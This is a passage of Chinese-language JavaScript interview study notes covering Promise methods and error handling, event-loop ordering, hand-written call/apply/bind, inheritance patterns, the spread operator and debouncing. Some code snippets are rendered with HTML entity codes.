对象后面要跟catch方法，这样可以处理 Promise内部发生的错误。catch方法返回的还是一个 Promise 对象，因此后面还可以接着调用then方法。\n\nPromise对象的错误具有“冒泡”性质，会一直向后传递，直到被捕获为止。也就是说，错误总是会被下一个catch语句捕获。 即：当前catch方法可以捕获上一个catch方法(包括上一个catch)到当前catch(不包括当前catch)方法之间所有的错误，如果没有错误，则当前catch方法不执行。\nnew Promise(() &#x3D;&gt; &#123;\n    throw new Error(&#39;err1&#39;);\n&#125;)\n    .then(() &#x3D;&gt; &#123;console.log(1);&#125;)\n    .then(() &#x3D;&gt; &#123;console.log(2);&#125;)\n    .catch((err) &#x3D;&gt; &#123;\n        console.log(err); &#x2F;&#x2F;Err: err1\n        throw  new Error(&#39;err2&#39;);\n    &#125;)\n    .catch((err) &#x3D;&gt; &#123;console.log(err);&#125;)&#x2F;&#x2F;Err: err2\n\n一般来说，不要在then方法里面定义Reject状态的回调函数（即then的第二个参数），总是使用catch方法。\n// bad\nnew Promise()\n    .then((data) => &#123;/* success */ &#125;, (err) => &#123;/* error */ &#125;);\n\n// good\nnew Promise()\n    .then((data) => &#123; /* success */ &#125;)\n    .catch((err) => &#123;/* error */ &#125;);\n\n上面代码中，第二种写法要好于第一种写法，理由是第二种写法可以捕获前面then方法执行中的错误，也更接近同步的写法。\n\n与传统的try/catch代码块不同的是，即使没有使用catch方法指定错误处理的回调函数，Promise 对象抛出的错误也不会中止外部脚本运行。\nnew Promise((resolve) => &#123;\n    // 下面一行会报错，因为x没有声明\n    resolve(x + 2);\n&#125;).then(() => &#123;\n    console.log('ok');\n&#125;);\nsetTimeout(() => &#123;console.log('over')&#125;);\n//Uncaught (in promise) ReferenceError: x is not defined\n//over\n\n在异步函数中抛出的错误不会被catch捕获到\nnew Promise((resolve, reject) &#x3D;&gt; &#123;\n    setTimeout(() &#x3D;&gt; &#123;\n        throw &#39;Uncaught Exception!&#39;;\n    &#125;, 1000);\n&#125;).catch(() &#x3D;&gt; &#123;\n    console.log(&#39;err&#39;); &#x2F;&#x2F;不会执行\n&#125;);\n\nnew Promise((resolve, reject) &#x3D;&gt; &#123;\n    setTimeout(() &#x3D;&gt; &#123;\n        reject();\n    &#125;, 1000);\n&#125;).catch(() &#x3D;&gt; &#123;\n    console.log(&#39;err&#39;); &#x2F;&#x2F;err\n&#125;);\n\n在resolve()后面抛出的错误会被忽略\nnew Promise((resolve, reject) => &#123;\n    resolve();\n    throw 'Silenced Exception!';\n&#125;).catch(function(e) &#123;\n    console.log(e); // 不会执行\n&#125;);\n\nPromise.all(iterable)\n\n语法var p = Promise.all([p1, p2, p3]);\n\n含义Promise.all方法接受一个数组作为参数，p1、p2、p3都是 Promise 实例，如果不是，就会先调用下面讲到的Promise.resolve方法，将参数转为 Promise 实例，再进一步处理。（Promise.all方法的参数可以不是数组，但必须具有 Iterator 接口，且返回的每个成员都是 Promise 实例。）p的状态由p1、p2、p3决定，分成两种情况。(1) 只有p1、p2、p3的状态都变成fulfilled，p的状态才会变成fulfilled，此时p1、p2、p3的返回值组成一个数组，传递给p的回调函数。(2) 只要p1、p2、p3之中有一个被rejected，p的状态就变成rejected，此时第一个被reject的实例的返回值，会传递给p的回调函数。\n\n用法\nconst p1 = 'p1-ok';\nconst p2 = Promise.resolve('p2-ok');\nconst p3 = new Promise((resolve) => setTimeout(resolve, 3000, 'p3-ok'));\nconst p4 = Promise.reject('p4-err');\nPromise.all([p1, p2, p3])\n    .then((resolves) => &#123;\n      resolves.forEach(resolve => &#123;\n          console.log(resolve); //p1-ok   p2-ok  p3-ok\n      &#125;);\n    &#125;)\n    .catch(() => &#123;\n      console.log('err');\n    &#125;);\n\nPromise.all([p1, p2, p3, p4])\n    .then(() => &#123;\n      console.log('ok');\n    &#125;)\n    .catch((err) => &#123;\n       console.log(err); //p4-err\n    &#125;)\n\nPromise.race(iterable)\n\n语法var p = Promise.race([p1, p2, p3]);\n\n含义Promise.race方法同样是将多个Promise实例，包装成一个新的Promise实例。只要p1、p2、p3之中有一个实例率先改变状态，p的状态就跟着改变。那个率先改变的 Promise 实例的返回值，就传递给p的回调函数。Promise.race方法的参数与Promise.all方法一样，如果不是 Promise 实例，就会先调用下面讲到的Promise.resolve方法，将参数转为Promise实例，再进一步处理。\n\n用法\nvar p1 = new Promise(resolve => &#123;setTimeout(resolve, 500, \"one\");&#125;);\nvar p2 = new Promise(resolve => &#123;setTimeout(resolve, 100, \"two\");&#125;);\nPromise.race([p1, p2])\n    .then(value => &#123;\n        console.log(value); // \"two\"\n    &#125;);\n\nvar p3 = new Promise(resolve => &#123;setTimeout(resolve, 100, \"three\");&#125;);\nvar p4 = new Promise((resolve, reject) => &#123;setTimeout(reject, 500, \"four\");&#125;);\n\nPromise.race([p3, p4])\n    .then((value) => &#123;\n        console.log(value); // \"three\"\n    &#125;)\n    .catch(err => &#123;\n        // 未被调用  \n    &#125;);\n\nvar p5 = new Promise(resolve => &#123;setTimeout(resolve, 500, \"five\");&#125;);\nvar p6 = new Promise((resolve, reject) => &#123;\n          setTimeout(reject, 100, \"six\");\n      &#125;);\n\nPromise.race([p5, p6])\n    .then((value) => &#123;\n      // 未被调用             \n    &#125;).catch((reason) => &#123;\n        console.log(reason); // \"six\"\n    &#125;);\n\nPromise.resolve(value)\n\n语法\nPromise.resolve(value);\nPromise.resolve(promise);\nPromise.resolve(thenable);\n\nPromise.resolve等价于下面的写法。\nPromise.resolve(value) ;\n// 等价于\nnew Promise(resolve => resolve(value));\n\n含义返回一个状态由给定value决定的Promise实例。\n\n用法(1) 如果该值是一个Promise对象，则直接返回该对象；\nconst p = new Promise((resolve) => &#123;resolve()&#125;);\nconst p2 = Promise.resolve(p);\nconsole.log(p === p2); //true\n\n(2) 如果参数是thenable对象(即带有then方法的对象)，则返回的Promise对象的最终状态由then方法的执行决定；\nconst thenable = &#123;\n    then(resolve, reject) &#123;\n        resolve(42);\n    &#125;\n&#125;;\nPromise.resolve(thenable)\n    .then((value) => &#123;\n        console.log(value);  // 42\n    &#125;);\n\n(3) 如果参数是不具有then方法的对象或基本数据类型，则返回的Promise对象的状态为fulfilled，并且将该参数传递给then方法。\nPromise.resolve('Hello')\n    .then((s) => &#123;\n        console.log(s); //Hello\n    &#125;);\n\n(4) 如果不带有任何参数，则返回的Promise对象的状态为fulfilled，并且将undefined作为参数传递给then方法。\nPromise.resolve()\n    .then((s) => &#123;\n        console.log(s); //undefined\n    &#125;);\n\n通常而言，如果你不知道一个值是否是Promise对象，使用Promise.resolve(value) 来返回一个Promise对象,这样就能将该value以Promise对象形式使用。\n\n立即resolve的Promise对象，是在本轮“事件循环”（event loop）的结束时，而不是在下一轮“事件循环”的开始时。\nsetTimeout(function () &#123;\n    console.log('three');\n&#125;, 0);\n\nPromise.resolve().then( () => &#123;\n    console.log('two');\n&#125;);\n\nconsole.log('one');\n// one \n// two\n// three\n\nPromise.reject(reason)\n\n语法\nPromise.reject(reason);\n\nPromise.reject等价于下面的写法。\nvar p = Promise.reject(reason);\n// 等同于\nvar p = new Promise((resolve, reject) => reject(reason));\n\n含义返回一个状态为rejected的Promise对象，并将给定的失败信息传递给对应的处理方法。\n\n\n\n\n\n\n\n\n\n\n\n注意：Promise.resolve(value)方法返回的Promise实例的状态由value决定，可能是fulfilled，也可能是rejected。Promise.reject(reason)方法返回的Promise实例的状态一定是rejected。\n\n用法\nPromise.reject(\"Testing static reject\")\n    .then((value) => &#123;\n        // 未被调用\n    &#125;).catch((reason) => &#123;\n        console.log(reason); // Testing static reject\n    &#125;);\n\nPromise.reject(new Error(\"fail\"))\n    .then((value) => &#123;\n        // 未被调用\n    &#125;).catch((error) => &#123;\n        console.log(error); // Error: fail\n    &#125;);\n\nPromise.reject()方法的参数，会原封不动地作为reject的理由，变成后续方法的参数。这一点与Promise.resolve方法不一致。\nconst thenable = &#123;\n    then(resolve) &#123;\n        resolve('ok');\n    &#125;\n&#125;;\n\nPromise.resolve(thenable)\n    .then(e => &#123;\n        console.log(e === 'ok'); //true\n    &#125;);\n\nPromise.reject(thenable)\n    .catch(e => &#123;\n        console.log(e === thenable); // true\n    &#125;);\n\n与promise.all相反的是哪一个\n参考答案：\nPromse.race就是赛跑的意思，意思就是说，Promise.race([p1, p2, p3])里面哪个结果获得的快，就返回那个结果，不管结果本身是成功状态还是失败状态。\n扩展：\n语法\nPromise.race(iterable);\n\n参数\n\niterable\n可迭代对象，类似Array\n\n\n返回值\n 一个待定的 Promise]只要给定的迭代中的一个promise解决或拒绝，就采用第一个promise的值作为它的值， 从而异步地解析或拒绝（一旦堆栈为空）\n33、promise实现文件读取\n// const fs = require(\"fs\");\nimport fs from \"fs\";\nimport path from \"path\";\nconst __dirname = path.resolve();\nfunction readFile(file) &#123;\n  return new Promise((resolve, reject) => &#123;\n    fs.readFile(path.join(__dirname, file), (err, data) => &#123;\n      if (data) &#123;\n        resolve(data.toString());\n      &#125; else &#123;\n        reject(err);\n      &#125;\n    &#125;);\n  &#125;);\n&#125;\n\nreadFile(\"./JavaScript/promise/file/file1.txt\")\n  .then((data) => &#123;\n    console.log(data);\n    return readFile(\"./JavaScript/promise/file/file1.txt\");\n  &#125;)\n  .then((data) => &#123;\n    console.log(data);\n  &#125;);\n\n\n\n\n33、用js实现sleep，用promisefunction SLeep_p(time) &#123;\n  return new Promise((resolve, reject) => &#123;\n    setTimeout(resolve, time);\n  &#125;);\n&#125;\n\nSLeep_p(2000).then(() => &#123;\n  console.log(\"kif\");\n&#125;);\n\n\n\n\n\n34、js执行顺序的题目，涉及到settimeout、console、process.nextTick、promise.thenconsole.time('start');\n\nsetTimeout(function() &#123;\n  console.log(2);\n&#125;, 10);\n\nsetImmediate(function() &#123;\n  console.log(1);\n&#125;);\n\nnew Promise(function(resolve) &#123;\n  console.log(3);\n  resolve();\n  console.log(4);\n&#125;).then(function() &#123;\n  console.log(5);\n  console.timeEnd('start')\n&#125;);\n\nconsole.log(6);\n\nprocess.nextTick(function() &#123;\n  console.log(7);\n&#125;);\n\nconsole.log(8);\n\n参考答案：\n综合的执行顺序就是： 3——&gt;4——&gt;6——&gt;8——&gt;7——&gt;5——&gt;start: 7.009ms——&gt;1——&gt;2\n解析：\n本题目，考察的就是 node 事件循环 Event Loop 我们可以简单理解Event Loop如下：\n\n所有任务都在主线程上执行，形成一个执行栈(Execution Context Stack)\n在主线程之外还存在一个任务队列(Task Queen),系统把异步任务放到任务队列中，然后主线程继续执行后续的任务\n一旦执行栈中所有的任务执行完毕，系统就会读取任务队列。如果这时异步任务已结束等待状态，就会从任务队列进入执行栈，恢复执行\n主线程不断重复上面的第三步\n\n在上述的例子中，我们明白首先执行主线程中的同步任务，因此依次输出3、4、6、8。当主线程任务执行完毕后，再从Event Loop中读取任务。\nEvent Loop读取任务的先后顺序，取决于任务队列（Job queue）中对于不同任务读取规则的限定。\n在Job queue中的队列分为两种类型：\n宏任务 Macrotask 宏任务是指Event Loop在每个阶段执行的任务\n微任务 Microtask 微任务是指Event Loop在每个阶段之间执行的任务\n我们举例来看执行顺序的规定，我们假设\n宏任务队列包含任务: A1, A2 , A3\n微任务队列包含任务: B1, B2 , B3\n执行顺序为，首先执行宏任务队列开头的任务，也就是 A1 任务，执行完毕后，在执行微任务队列里的所有任务，也就是依次执行B1, B2 , B3，执行完后清空微任务队中的任务，接着执行宏任务中的第二个任务A2，依次循环。\n了解完了宏任务 Macrotask和微任务 Microtask两种队列的执行顺序之后，我们接着来看，真实场景下这两种类型的队列里真正包含的任务（我们以node V8引擎为例），在node V8中，这两种类型的真实任务顺序如下所示：\n宏任务 Macrotask队列真实包含任务：\nscript(主程序代码),setTimeout, setInterval, setImmediate, I&#x2F;O, UI rendering\n\n微任务 Microtask队列真实包含任务：\nprocess.nextTick, Promises, Object.observe, MutationObserver\n\n由此我们得到的执行顺序应该为：\nscript(主程序代码)—&gt;process.nextTick—&gt;Promises...——&gt;setTimeout——&gt;setInterval——&gt;setImmediate——&gt; I&#x2F;O——&gt;UI rendering\n\n\n\n\n\n\n\n\n\n\n在ES6中宏任务 Macrotask队列又称为ScriptJobs，而微任务 Microtask又称PromiseJobs\n我们的题目相对复杂，但是要注意，我们在定义promise的时候，promise构造部分是同步执行的\n接下来我们分析我们的题目，首先分析Job queue的执行顺序：\nscript(主程序代码)——&gt;process.nextTick——&gt;promise——&gt;setTimeout——&gt;setImmediate\n\n\n主体部分： 定义promise的构造部分是同步的，因此先输出3、4 ，主体部分再输出6、8（同步情况下，就是严格按照定义的先后顺序）\nprocess.nextTick: 输出7\npromise： 这里的promise部分，严格的说其实是promise.then部分，输出的是5、以及 timeEnd(‘start’)\nsetImmediate：输出1，依据上面优先级，应该先setTimeout，但是注意，setTimeout 设置 10ms 延时\nsetTimeout ： 输出2\n\n35、call appy bind的作用和区别参考答案：\n作用：\n 都可以改变函数内部的this指向。\n区别点：\n\ncall 和 apply 会调用函数，并且改变函数内部this指向。\ncall 和 apply 传递的参数不一样，call 传递参数arg1,arg2…形式 apply 必须数组形式[arg]\nbind 不会调用函数，可以改变函数内部this指向。\n\n解析：\ncall方法\n改变函数内部this指向\ncall()方法调用一个对象。简单理解为调用函数的方式，但是它可以改变函数的this指向。\n写法：fun.call(thisArg, arg1, arg3, …) &#x2F;&#x2F; thisArg为想要指向的对象，arg1,arg3为参数\ncall 的主要作用也可以实现继承\n\n\napply方法\napply()方法调用一个函数。简单理解为调用函数的方式，但是它可以改变函数的this指向。\n写法：fun.apply(thisArg, [argsArray])\n\nthisArg:在fun函数运行时指定的this值\nargsArray:传递的值，必须包含在数组里面\n返回值就是函数的返回值，因为他就是调用函数\n\napply的主要应用，比如可以利用apply可以求得数组中最大值\nconst arr &#x3D; [1, 22, 3, 44, 5, 66, 7, 88, 9];&#96;&#96;const max &#x3D; Math.max.apply(Math, arr);&#96;&#96;console.log(max);\n\nbind方法\nbind()方法不会调用函数，但是能改变函数内部this指向\n写法：fun.bind(thisArg, arg1, arg2, …)\n\nthisArg:在fun函数运行时指定的this值\narg1,arg2:传递的其他参数\n返回由指定的this值和初始化参数改造的原函数拷贝\n\nvar&#96; &#96;o &#x3D; &#123;&#96;&#96;  &#96;&#96;name: &#96;&#96;&quot;lisa&quot;&#96;&#96;&#125;;&#96;&#96;function&#96; &#96;fn() &#123;&#96;&#96;  &#96;&#96;console.log(&#96;&#96;this&#96;&#96;);&#96;&#96;&#125;&#96;&#96;var&#96; &#96;f &#x3D; fn.bind(o);&#96;&#96;f();\n\nbind应用\n如果有的函数我们不需要立即调用，但是又需要改变这个函数的this指向，此时用bind再合适不过了\nconst btns &#x3D; document.querySelectorAll(&#96;&#96;&quot;button&quot;&#96;&#96;);&#96;&#96;for&#96; &#96;(let i &#x3D; 0; i &lt; btns.length; i++) &#123;&#96;&#96;  &#96;&#96;btns[i].onclick &#x3D; &#96;&#96;function&#96;&#96;() &#123;&#96;&#96;   &#96;&#96;this&#96;&#96;.disabled &#x3D; &#96;&#96;true&#96;&#96;;&#96;&#96;   &#96;&#96;setTimeout(&#96;&#96;    &#96;&#96;function&#96;&#96;() &#123;&#96;&#96;     &#96;&#96;this&#96;&#96;.disabled &#x3D; &#96;&#96;false&#96;&#96;;&#96;&#96;    &#96;&#96;&#125;.bind(&#96;&#96;this&#96;&#96;),&#96;&#96;    &#96;&#96;2000&#96;&#96;   &#96;&#96;);&#96;&#96;  &#96;&#96;&#125;;&#96;&#96;&#125;\n\n扩展:\n主要应用场景：\n\ncall 经常做继承。\napply 经常跟数组有关系，比如借助于数学对象实现数组最大值最小值。\nbind 不调用函数，但是还想改变this指向，比如改变定时器内部的this指向。\n\n手写bind// bind体验\n// 改变this指向\n\nfunction func(...args) &#123;\n    console.log(this)\n    console.log(args)\n&#125;\n// func(1, 2, 3, 4)\n// undefined\n// [ 1, 2, 3, 4 ]\n\nlet Fu = func.bind(&#123; a: 1 &#125;, 1, 2, 3, 4)\n// Fu()\n// &#123; a: 1 &#125;\n// [ 1, 2, 3, 4 ]\nlet Fu2 = func.bind(1, 1, 2, 3, 4)\n// Fu2()\n// 1\n// [ 1, 2, 3, 4 ]\n\n// bind实现思路：\n// 判断是否是函数调用，若非函数调用抛出异常\n\n// 返回函数\n\n// 判断函数的调用方式，是否是被new出来的\n// new出来的话，返回空对象，但是实例的 __ proto__ 指向_this的prototype\nvar age = 16;\nvar gender = 'female';\n\nvar obj = &#123;\n    age: 11,\n    gender: 'male'\n&#125;\n\nfunction Test(a, b) &#123;\n    //   console.log(this.age);\n    //   console.log(this.gender);\n    console.log(this)\n    if (this) &#123;\n        console.log(this.age);\n        console.log(this.gender);\n    &#125;\n    console.log(a);\n    console.log(b);\n&#125;\n\nTest.bind(obj, 3, 7)()\n\nFunction.prototype.myBind = function (obj, ...args) &#123;\n    obj.fn = this\n    let result\n    return function () &#123;\n        result = obj.fn(...args)\n        delete obj.fn\n        return result\n    &#125;\n&#125;\nTest.myBind(obj,3,8)()\n\n手写call// 思路\n// 判断是否是函数调用，若非函数调用抛异常\n// 通过新对象（context）来调用函数\n// 给context创建一个fn设置为需要调用的函数\n// 结束调用完之后删除fn\n\n\n// Function.prototype.myCall = function (contents) &#123;\n//     //判断是否是函数调用，不是就抛出异常\n//     //这里的this 就是调用my_call的\n//     if (typeof this !== 'function') &#123;\n//         return\n//     &#125;\n//     // 不传参默认为window\n//     contents = contents || window\n//     // 保存this\n//     contents.fn = this\n//     // 获取参数\n//     let args = [...arguments].slice(1)\n//     let result = contents.fn(...args)\n//     delete contents.fn\n\n//     return result\n\n// &#125;\nvar age = 16;\nvar gender = 'female';\n\nvar obj = &#123;\n    age: 11,\n    gender: 'male'\n&#125;\n\nfunction Test(a, b) &#123;\n    //   console.log(this.age);\n    //   console.log(this.gender);\n    console.log(this)\n    if (this) &#123;\n        console.log(this.age);\n        console.log(this.gender);\n    &#125;\n    console.log(a);\n    console.log(b);\n&#125;\n// Test(3, 5);\n// Test.call(obj, 22, 33);\n\nFunction.prototype.myCall = function (obj, ...args) &#123;\n    if (typeof this !== 'function') &#123;\n        return\n    &#125;\n    obj.fn = this\n    let result = obj.fn(...args)\n    delete obj.fn\n    return result\n&#125;\nTest.myCall(obj,3,6)\n\n\n\n手写apply// 思路\n// 判断是否是函数调用，若非函数调用抛异常\n// 通过新对象（context）来调用函数\n// 给context创建一个fn设置为需要调用的函数\n// 结束调用完之后删除fn\n\n\nFunction.prototype.myApply = function (context) &#123;\n    if (typeof this !== 'function') &#123;\n        return\n    &#125;\n    context = context || window\n    context.fn = this\n    let args = [...arguments].slice(1)\n    let result = context.fn(...args)\n    delete context.fn\n    return result\n&#125;\n\n\n\n36、继承，优缺点参考答案：\n\n继承的好处\na：提高了代码的复用性\nb：提高了代码的维护性\nc：让类与类之间产生了关系，是多态的前提\n\n\n继承的弊端\n类的耦合性增强了,但是开发的原则：高内聚，低耦合。\n\n\n\n37、ES5 js继承的方法和优缺点参考答案：\n\n原型链继承\n实现方式：将子类的原型链指向父类的对象实例\nfunction Parent()&#123;\n  this.name = \"parent\";\n  this.list = ['a'];\n&#125;\nParent.prototype.sayHi = function()&#123;\n  console.log('hi');\n&#125;\nfunction Child()&#123;\n\n&#125;\nChild.prototype = new Parent();\nvar child = new Child();\nconsole.log(child.name);\nchild.sayHi();\n\n原理：子类实例child的__proto__指向Child的原型链prototype，而Child.prototype指向Parent类的对象实例，该父类对象实例的__proto__指向Parent.prototype,所以Child可继承Parent的构造函数属性、方法和原型链属性、方法优点：可继承构造函数的属性，父类构造函数的属性，父类原型的属性缺点：无法向父类构造函数传参；且所有实例共享父类实例的属性，若父类共有属性为引用类型，一个子类实例更改父类构造函数共有属性时会导致继承的共有属性发生变化；实例如下：\nvar a = new Child();\nvar b = new Child();\na.list.push('b');\nconsole.log(b.list); // ['a','b']\n\n构造函数继承\n实现方式：在子类构造函数中使用call或者apply劫持父类构造函数方法，并传入参数\nfunction Parent(name, id)&#123;\n  this.id = id;\n  this.name = name;\n  this.printName = function()&#123;\n    console.log(this.name);\n  &#125;\n&#125;\nParent.prototype.sayName = function()&#123;\n  console.log(this.name);\n&#125;;\nfunction Child(name, id)&#123;\n  Parent.call(this, name, id);\n  // Parent.apply(this, arguments);\n&#125;\nvar child = new Child(\"jin\", \"1\");\nchild.printName(); // jin\nchild.sayName() // Error\n\n原理：使用call或者apply更改子类函数的作用域，使this执行父类构造函数，子类因此可以继承父类共有属性优点：可解决原型链继承的缺点缺点：不可继承父类的原型链方法，构造函数不可复用\n\n组合继承\n原理：综合使用构造函数继承和原型链继承\nfunction Parent(name, id)&#123;\n  this.id = id;\n  this.name = name;\n  this.list = ['a'];\n  this.printName = function()&#123;\n    console.log(this.name);\n  &#125;\n&#125;\nParent.prototype.sayName = function()&#123;\n  console.log(this.name);\n&#125;;\nfunction Child(name, id)&#123;\n  Parent.call(this, name, id);\n  // Parent.apply(this, arguments);\n&#125;\nChild.prototype = new Parent();\nvar child = new Child(\"jin\", \"1\");\nchild.printName(); // jin\nchild.sayName() // jin\n\nvar a = new Child();\nvar b = new Child();\na.list.push('b');\nconsole.log(b.list); // ['a']\n\n优点：可继承父类原型上的属性，且可传参；每个新实例引入的构造函数是私有的缺点：会执行两次父类的构造函数，消耗较大内存，子类的构造函数会代替原型上的那个父类构造函数\n\n原型式继承\n原理：类似Object.create，用一个函数包装一个对象，然后返回这个函数的调用，这个函数就变成了个可以随意增添属性的实例或对象，结果是将子对象的__proto__指向父对象\nvar parent = &#123;\n  names: ['a']\n&#125;\nfunction copy(object) &#123;\n  function F() &#123;&#125;\n  F.prototype = object;    \n  return new F();\n&#125;\nvar child = copy(parent);\n\n缺点：共享引用类型\n\n寄生式继承\n原理：二次封装原型式继承，并拓展\nfunction createObject(obj) &#123;\n  var o = copy(obj);\n  o.getNames = function() &#123;\n    console.log(this.names);\n    return this.names;\n  &#125;\n  return o;\n&#125;\n\n优点：可添加新的属性和方法\n\n寄生组合式继承\n原理：改进组合继承，利用寄生式继承的思想继承原型\nfunction inheritPrototype(subClass, superClass) &#123;\n  // 复制一份父类的原型\n  var p = copy(superClass.prototype);\n  // 修正构造函数\n  p.constructor = subClass;\n  // 设置子类原型\n  subClass.prototype = p;\n&#125;\n\nfunction Parent(name, id)&#123;\n  this.id = id;\n  this.name = name;\n  this.list = ['a'];\n  this.printName = function()&#123;\n    console.log(this.name);\n  &#125;\n&#125;\nParent.prototype.sayName = function()&#123;\n  console.log(this.name);\n&#125;;\nfunction Child(name, id)&#123;\n  Parent.call(this, name, id);\n  // Parent.apply(this, arguments);\n&#125;\ninheritPrototype(Child, Parent);\n\n\n38、ES6继承class Parent &#123;\n  constructor() &#123;\n    this.name = \"kif\";\n    this.age = 12;\n  &#125;\n&#125;\nclass Child extends Parent &#123;\n  constructor(id) &#123;\n    super();\n    this.id = id;\n  &#125;\n&#125;\n\nlet p = new Child();\nconsole.log(p.name);\n\n\n\n\n39、扩展操作符…适用类型：数组、对象、字符串。\n复杂数据类型都可以，当要转化为可迭代数据结构时可设置对象的迭代器对扩展运算符扩展出来的值进行操作。\n基础数据只有string可以使用扩展运算符，number,boolean,null,undefined无效\n扩展运算符的应用场景\n// 1、函数调用\nfunction add(x, y) &#123;\n  return x + y;\n&#125;\nadd(...[4, 38]);\n\nfunction f(v, w, x, y, z) &#123;  &#125;\nf(-1, ...[0, 1], 2, ...[3]);\n// 123456789\n\n//2.往数组里push多个元素\nvar arr1 = [0, 1, 2];\nvar arr2 = [3, 4, 5];\narr1.push(...arr2);  \nconsole.log(arr1); //[0,1,2,3,4,5]\n//123456\n\n//3.替代函数的apply方法\nfunction f(x, y, z) &#123;  &#125;  \nvar args = [0, 1, 2];\nf.apply(null, args); //ES5 的写法\nf(...args); //ES6的写法\n// 123456\n\n//4.求一个数组的最大数简化\nMath.max.apply(null, [14, 3, 77])  //ES5 的写法\nMath.max(...[14, 3, 77])  //ES6 的写法，等同于Math.max(14, 3, 77)\n//1234\n\n//5.扩展运算符后面可以放表达式\nconst arr = [...(5 > 0 ? ['a'] : []),'b'];\nconsole.log(arr);  //['a','b'] \n//1234\n\n//6.与解构赋值结合，用于生成数组\nconst a1 = [1, 2];\nconst a2 = [...a1];  //写法1\nconst [...a2] = a1;  //写法2\nconst [first, ...rest] = [1, 2, 3, 4, 5];\nfirst  //1\nrest  //[2, 3, 4, 5]\n\nconst [first, ...rest] = [];\nfirst  //undefined\nrest  //[]\n\nconst [first, ...rest] = [\"foo\"];\nfirst  //\"foo\"\nrest   //[]\n//1234567891011121314151617\n\n//7.合并数组\n[...arr1, ...arr2, ...arr3]  //[ 'a', 'b', 'c', 'd', 'e' ]\n\n\n//8.数组的克隆——————————————————————特别注意\nvar arr1 = [0, 1, 2];\nvar arr2 = [...arr1];\narr1[0]=100;\nconsole.log(arr2); //[0, 1, 2]  \n\n/* 乍一看，arr2与arr1不共用引用地址，arr2不随着arr1变化，接着往下看 */\n\nvar arr1 = [0, [1,11,111], 2];\nvar arr2 = [...arr1];\narr1[1][0]=100;\nconsole.log(arr2); //[0, [100,11,111], 2]\n\n40、为什么js是单线程参考答案：\n这主要和js的用途有关，js是作为浏览器的脚本语言，主要是实现用户与浏览器的交互，以及操作dom；这决定了它只能是单线程，否则会带来很复杂的同步问题。 举个例子：如果js被设计了多线程，如果有一个线程要修改一个dom元素，另一个线程要删除这个dom元素，此时浏览器就会一脸茫然，不知所措。所以，为了避免复杂性，从一诞生，JavaScript就是单线程，这已经成了这门语言的核心特征，将来也不会改变\n扩展：\n什么是进程？\n进程：是cpu分配资源的最小单位；（是能拥有资源和独立运行的最小单位）\n什么是线程？\n线程：是cpu调度的最小单位；（线程是建立在进程的基础上的一次程序运行单位，一个进程中可以有多个线程）\n浏览器是多进程的？\n放在浏览器中，每打开一个tab页面，其实就是新开了一个进程，在这个进程中，还有ui渲染线程，js引擎线程，http请求线程等。 所以，浏览器是一个多进程的。\n为了利用多核CPU的计算能力，HTML5提出Web Worker标准，允许JavaScript脚本创建多个线程，但是子线程完全受主线程控制，且不得操作DOM。所以，这个新标准并没有改变JavaScript单线程的本质。\n41、死锁参考答案：\n死锁是指两个或两个以上的进程在执行过程中，由于竞争资源而造成阻塞的现象，若无外力作用，它们都将无法继续执行\n产生原因\n\n竞争资源引起进程死锁\n可剥夺和非剥夺资源\n竞争非剥夺资源\n竞争临时性资源\n进程推进顺序不当\n\n产生条件\n\n互斥条件：涉及的资源是非共享的\n涉及的资源是非共享的,一段时间内某资源只由一个进程占用,如果此时还有其它进程请求资源，则请求者只能等待，直至占有资源的进程用毕释放\n\n\n不剥夺条件：不能强行剥夺进程拥有的资源\n进程已获得的资源，在未使用完之前，不能被剥夺，只能在使用完时由自己释放\n\n\n请求和保持条件：进程在等待一新资源时继续占有已分配的资源\n指进程已经保持至少一个资源，但又提出了新的资源请求，而该资源已被其它进程占有，此时请求进程阻塞，但又对自己已获得的其它资源保持不放\n\n\n环路等待条件：存在一种进程的循环链，链中的每一个进程已获得的资源同时被链中的下一个进程所请求 在发生死锁时，必然存在一个进程——资源的环形链\n\n解决办法\n只要打破四个必要条件之一就能有效预防死锁的发生\n42、面向对象的三个特征，分别说一下什么意思参考答案：\n概念：\n封装：将对象运行所需的资源封装在程序对象中——基本上，是方法和数据。对象是“公布其接口”。其他附加到这些接口上的对象不需要关心对象实现的方法即可使用这个对象。这个概念就是“不要告诉我你是怎么做的，只要做就可以了。”对象可以看作是一个自我包含的原子。对象接口包括了公共的方法和初始化数据。\n继承： 继承可以解决代码复用，让编程更加靠近人类思维。当多个类存在相同的属性(变量)和方法时，可以从这些类中抽象出父类，在父类中定义这些相同的属性和方法，所有的子类不需要重新定义这些属性和方法，只需要通过继承父类中的属性和方法。\n多态： 多态是指一个引用(类型)在不同情况下的多种状态。也可以理解成：多态是指通过指向父类的引用，来调用在不同子类中实现的方法。\n特点：\n封装可以隐藏实现细节，使得代码模块化；\n继承可以扩展已存在的代码模块（类），它们的目的都是为了——代码重用。\n多态就是相同的事物，调用其相同的方法，参数也相同时，但表现的行为却不同。多态分为两种，一种是行为多态与对象的多态\n43、防抖和节流的原理和使用场景参考答案：\n函数防抖和函数节流：优化高频率执行js代码的一种手段，js中的一些事件如浏览器的resize、scroll，鼠标的mousemove、mouseover，input输入框的keypress等事件在触发时，会不断地调用绑定在事件上的回调函数，极大地浪费资源，降低前端性能。为了优化体验，需要对这类事件进行调用次数的限制。\n防抖：\n在事件被触发n秒后再执行回调，如果在这n秒内又被触发，则重新计时。\n根据函数防抖思路设计出第一版的最简单的防抖代码：\nvar timer; &#x2F;&#x2F; 维护同一个timer\nfunction debounce(fn, delay) &#123;\n    clearTimeout(timer);\n    timer &#x3D; setTimeout(function()&#123;\n        fn();\n    &#125;, delay);\n&#125;\n\n上面例子中的debounce就是防抖函数，在document中鼠标移动的时候，会在onmousemove最后触发的1s后执行回调函数testDebounce；如果我们一直在浏览器中移动鼠标（比如10s），会发现会在10 + 1s后才会执行testDebounce函数（因为clearTimeout(timer)），这个就是函数防抖。\n在上面的代码中，会出现一个问题，var timer只能在setTimeout的父级作用域中，这样才是同一个timer，并且为了方便防抖函数的调用和回调函数fn的传参问题，我们应该用闭包来解决这些问题。\n优化后的代码：\nfunction debounce(fn, delay) &#123;\n    var timer; // 维护一个 timer\n    return function () &#123;\n        var _this = this; // 取debounce执行作用域的this\n        var args = arguments;\n        if (timer) &#123;\n            clearTimeout(timer);\n        &#125;\n        timer = setTimeout(function () &#123;\n            fn.apply(_this, args); // 用apply指向调用debounce的对象，相当于_this.fn(args);\n        &#125;, delay);\n    